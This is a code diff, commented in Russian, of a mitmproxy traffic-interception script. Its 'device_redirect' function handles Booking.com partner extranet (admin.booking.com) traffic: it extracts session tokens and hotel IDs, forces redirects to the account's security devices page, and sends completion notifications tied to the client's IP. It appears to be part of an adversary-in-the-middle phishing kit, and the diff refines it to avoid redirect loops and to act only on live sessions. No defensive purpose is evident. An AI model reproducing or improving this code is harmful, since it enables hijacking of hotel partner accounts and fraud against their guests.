@@ -1609,11 +1609,11 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
         log(traceback.format_exc())
         return False
 
-# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 23 ==========
+# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 23 (БЕЗОПАСНАЯ) ==========
 def device_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 23: ИСПРАВЛЕННАЯ ВЕРСИЯ - РАБОТАЕТ ТОЛЬКО С admin.booking.com
-    Теперь, как и функция 18, дожидается появления ses и не делает вечных редиректов
+    ФУНКЦИЯ 23: РАБОТАЕТ ТОЛЬКО С admin.booking.com И ТОЛЬКО С ЖИВОЙ СЕССИЕЙ
+    Полностью исключает редиректы с account.booking.com
     """
     try:
         if not should_device():
@@ -1622,7 +1622,12 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
         url = flow.request.pretty_url
         host = (flow.request.pretty_host or "").lower()
         
-        # ====== ТОЛЬКО admin.booking.com (как в функции 18) ======
+        # ====== КРИТИЧЕСКИ ВАЖНО: НИКОГДА НЕ РЕДИРЕКТИМ account.booking.com ======
+        if host.endswith("account.booking.com"):
+            # Просто игнорируем - никаких редиректов!
+            return False
+        
+        # ====== РАБОТАЕМ ТОЛЬКО С admin.booking.com ======
         if not host.endswith("admin.booking.com"):
             return False
         
@@ -1631,9 +1636,8 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
             return False
         
         # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ ======
-        # Если в URL есть auth_assurance_last_check - функция завершена
         if "auth_assurance_last_check=" in url.lower():
-            log("Function 23: ✓ Detected auth_assurance_last_check -> FUNCTION COMPLETED")
+            log("Function 23: ✓ Detected auth_assurance_last_check -> COMPLETED")
             client_ip = get_client_ip(flow)
             send_function_complete_notification(client_ip, url, "FUNCTION_23_COMPLETE")
             
@@ -1643,26 +1647,25 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
             
             remove_device_flag()
             
-            # Редирект на главную после завершения (как в функции 18)
+            # Редирект на главную после завершения
             target_url = "https://admin.booking.com/hotel/hoteladmin/"
             flow.response = http.Response.make(302, b"", {"Location": target_url})
             return True
         
         # ====== ЕСЛИ МЫ УЖЕ НА СТРАНИЦЕ devices.html ======
-        # Как в функции 18: если мы уже на целевой странице, но без всех параметров - ждём
         if "security/devices.html" in url:
             parsed = urllib.parse.urlparse(url)
             query = urllib.parse.parse_qs(parsed.query)
             
-            # Проверяем, есть ли hotel_id (обязательный параметр)
-            if "hotel_id" in query:
-                log("Function 23: On devices.html with hotel_id, waiting for auth_assurance_last_check")
-                return False  # НЕ ДЕЛАЕМ РЕДИРЕКТ, ПРОСТО ЖДЁМ
+            # Проверяем наличие параметров
+            if "hotel_id" in query and "ses" in query:
+                log("Function 23: On devices.html with all params, waiting for auth_assurance_last_check")
+                return False  # Ждём завершения
             
-            log("Function 23: On devices.html but missing hotel_id - will redirect when ready")
-            # Всё равно не делаем редирект, чтобы не зациклиться
+            log("Function 23: On devices.html but missing params - waiting")
+            return False
         
-        # ====== ПОЛУЧАЕМ ПАРАМЕТРЫ ИЗ URL ======
+        # ====== ПОЛУЧАЕМ ПАРАМЕТРЫ ======
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
         
@@ -1670,31 +1673,37 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
         ses = query.get("ses", [None])[0]
         lang = query.get("lang", ["en"])[0]
         
-        # Пробуем найти hotel_id в пути URL (как в функции 18)
+        # Пробуем найти hotel_id в пути
         if not hotel_id:
             m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
             if m:
                 hotel_id = m.group(1)
         
-        # ====== ВАЖНО: ЕСЛИ НЕТ SES - НЕ ДЕЛАЕМ РЕДИРЕКТ! ======
-        # Это главная причина вечных редиректов!
+        # ====== БЕЗ SES ИЛИ HOTEL_ID - НИКАКИХ РЕДИРЕКТОВ ======
         if not ses:
             log("Function 23: ⚠️ No ses parameter - waiting for authentication, NO REDIRECT")
             return False
         
-        # ====== ЕСЛИ НЕТ HOTEL_ID - ТОЖЕ НЕ ДЕЛАЕМ РЕДИРЕКТ ======
         if not hotel_id:
             log("Function 23: ⚠️ No hotel_id parameter - NO REDIRECT")
             return False
         
-        # ====== ПРОВЕРЯЕМ, НЕ НАХОДИМСЯ ЛИ МЫ УЖЕ НА ЦЕЛЕВОЙ СТРАНИЦЕ ======
+        # ====== ПРОВЕРЯЕМ, НЕ НА ХОСТЕ ЛИ ЛОГИНА ======
+        # Дополнительная защита: если в реферере есть account.booking.com - не редиректим
+        referer = flow.request.headers.get("Referer") or ""
+        if "account.booking.com" in referer.lower():
+            log("Function 23: ⚠️ Coming from login page - session might be new, waiting")
+            return False
+        
+        # ====== ФОРМИРУЕМ ЦЕЛЕВОЙ URL ======
         target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/security/devices.html?lang={lang}&ses={ses}&hotel_id={hotel_id}"
         
+        # Проверяем, не на той же странице
         if url == target_url:
             log("Function 23: Already on correct devices page")
             return False
         
-        # ====== ВЫПОЛНЯЕМ РЕДИРЕКТ (ТОЛЬКО ЕСЛИ ЕСТЬ ВСЁ НЕОБХОДИМОЕ) ======
+        # ====== ВЫПОЛНЯЕМ РЕДИРЕКТ (ТОЛЬКО ЕСЛИ ВСЁ ХОРОШО) ======
         log(f"Function 23: Device redirect {url} -> {target_url}")
         
         client_ip = get_client_ip(flow)
